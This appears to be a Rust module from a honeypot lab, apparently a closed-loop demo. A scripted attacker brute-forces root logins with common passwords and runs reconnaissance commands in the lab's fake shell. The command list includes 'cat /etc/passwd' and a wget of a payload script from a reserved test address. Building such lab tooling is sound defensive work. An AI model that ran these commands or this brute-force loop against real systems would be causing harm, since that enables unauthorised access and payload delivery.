//! Atacante guionizado que usa la demostración.
//!
//! Solo se conecta a la trampa de este laboratorio, así que la demostración es un
//! bucle cerrado: el «atacante» es parte del proyecto y nunca llega a un sistema de terceros.

use std::io::{Read, Write};
use std::net::TcpStream;
use std::time::Duration;

/// Contraseñas sintéticas, todas típicas de una lista de fuerza bruta.
pub const DEFAULT_PASSWORDS: &[&str] = &["123456", "admin", "toor", "password"];

/// Órdenes que el atacante guionizado ejecuta una vez dentro del shell falso.
///
/// La dirección de descarga pertenece al rango TEST-NET-2 (RFC 5737): nunca se resuelve
/// ni se contacta, el shell falso solo imprime lo que contestaría.
pub const DEFAULT_COMMANDS: &[&str] = &[
    "uname -a",
    "whoami",
    "id",
    "ls",
    "cat /etc/passwd",
    "wget http://198.51.100.7/payload.sh",
    "exit",
];

/// Un intento de credencial y lo que contestó la trampa.
#[derive(Debug, Clone)]
pub struct Attempt {
    pub user: String,
    pub password: String,
    pub response: String,
}

/// Todo lo que observó el atacante guionizado.
#[derive(Debug, Clone)]
pub struct AttackOutcome {
    pub banner: String,
    pub attempts: Vec<Attempt>,
    pub commands: Vec<(String, String)>,
}

/// Ejecuta el ataque guionizado contra `target` (por ejemplo `127.0.0.1:2222`).
pub fn run(target: &str, passwords: &[&str], timeout: Duration) -> Result<AttackOutcome, String> {
    let mut stream =
        TcpStream::connect(target).map_err(|e| format!("no se pudo conectar con {target}: {e}"))?;
    let _ = stream.set_read_timeout(Some(timeout));
    let _ = stream.set_write_timeout(Some(timeout));

    let mut buffer = String::new();
    let (_, banner) = read_until_any(&mut stream, &mut buffer, &["\n"], timeout)?;
    let banner = banner.trim_end().to_string();

    let mut attempts: Vec<Attempt> = Vec::new();
    let mut accepted = false;

    for password in passwords {
        let (marker, _) = read_until_any(
            &mut stream,
            &mut buffer,
            &["login: ", "Permission denied", "Welcome"],
            timeout,
        )?;
        if marker != "login: " {
            break;
        }
        write_line(&mut stream, "root")?;

        let (marker, _) = read_until_any(
            &mut stream,
            &mut buffer,
            &["Password: ", "Welcome"],
            timeout,
        )?;
        if marker != "Password: " {
            break;
        }
        write_line(&mut stream, password)?;

        let (marker, response) = read_until_any(
            &mut stream,
            &mut buffer,
            &["Permission denied", "Welcome", "root@victima:~# "],
            timeout,
        )?;
        attempts.push(Attempt {
            user: "root".to_string(),
            password: password.to_string(),
            response: response.trim().to_string(),
        });
        if marker != "Permission denied" {
            accepted = true;
            break;
        }
    }

    let mut commands: Vec<(String, String)> = Vec::new();
    if accepted {
        // El prompt puede seguir en el búfer: se consume antes de enviar nada, si no la
        // primera respuesta se leería una orden antes de tiempo.
        read_until_any(&mut stream, &mut buffer, &["root@victima:~# "], timeout)?;

        for command in DEFAULT_COMMANDS {
            write_line(&mut stream, command)?;
            if *command == "exit" {
                let mut rest = String::new();
                let _ = stream.read_to_string(&mut rest);
                commands.push((command.to_string(), rest.trim().to_string()));
                break;
            }
            let (_, response) =
                read_until_any(&mut stream, &mut buffer, &["root@victima:~# "], timeout)?;
            commands.push((command.to_string(), clean_response(&response)));
        }
    }

    Ok(AttackOutcome {
        banner,
        attempts,
        commands,
    })
}

fn write_line(stream: &mut TcpStream, line: &str) -> Result<(), String> {
    stream
        .write_all(format!("{line}\n").as_bytes())
        .map_err(|e| format!("no se pudo enviar «{line}»: {e}"))
}

/// Quita el prompt del shell falso que cierra cada respuesta.
///
/// El prompt se quita antes de recortar: si no, su espacio final también se
/// recortaría y el patrón ya no coincidiría.
fn clean_response(response: &str) -> String {
    response
        .trim_end_matches(crate::trap::SHELL_PROMPT)
        .trim()
        .to_string()
}

/// Lee hasta que aparezca una de las marcas y devuelve la marca y el texto leído.
fn read_until_any(
    stream: &mut TcpStream,
    buffer: &mut String,
    markers: &[&str],
    timeout: Duration,
) -> Result<(String, String), String> {
    loop {
        if let Some((index, marker, length)) = find_marker(buffer, markers) {
            let text: String = buffer.drain(..index + length).collect();
            return Ok((marker.to_string(), text));
        }

        let mut chunk = [0u8; 1024];
        match stream.read(&mut chunk) {
            Ok(0) => return Err("el honeypot cerró la conexión".to_string()),
            Ok(count) => buffer.push_str(&String::from_utf8_lossy(&chunk[..count])),
            Err(error) => {
                return Err(format!(
                    "fallo de lectura tras {}: {error}",
                    timeout.as_secs()
                ))
            }
        }
    }
}

/// Busca la marca más temprana dentro del búfer.
fn find_marker<'a>(buffer: &str, markers: &[&'a str]) -> Option<(usize, &'a str, usize)> {
    let mut best: Option<(usize, &str, usize)> = None;
    for marker in markers {
        if let Some(index) = buffer.find(marker) {
            let candidate = (index, *marker, marker.len());
            best = match best {
                Some(current) if current.0 <= candidate.0 => Some(current),
                _ => Some(candidate),
            };
        }
    }
    best
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn finds_the_earliest_marker() {
        let buffer = "abc login: def";
        let (index, marker, length) =
            find_marker(buffer, &["Password: ", "login: "]).expect("no hay marca");
        assert_eq!(index, 4);
        assert_eq!(marker, "login: ");
        assert_eq!(length, "login: ".len());
    }

    #[test]
    fn ignores_markers_that_are_not_there() {
        assert!(find_marker("nada que ver", &["login: "]).is_none());
    }

    #[test]
    fn the_default_list_is_synthetic() {
        assert!(DEFAULT_PASSWORDS.contains(&"123456"));
        assert!(DEFAULT_PASSWORDS.len() >= 3);
    }

    #[test]
    fn the_download_target_is_a_reserved_test_address() {
        assert!(DEFAULT_COMMANDS
            .iter()
            .any(|command| command.contains("198.51.100.7")));
    }
}
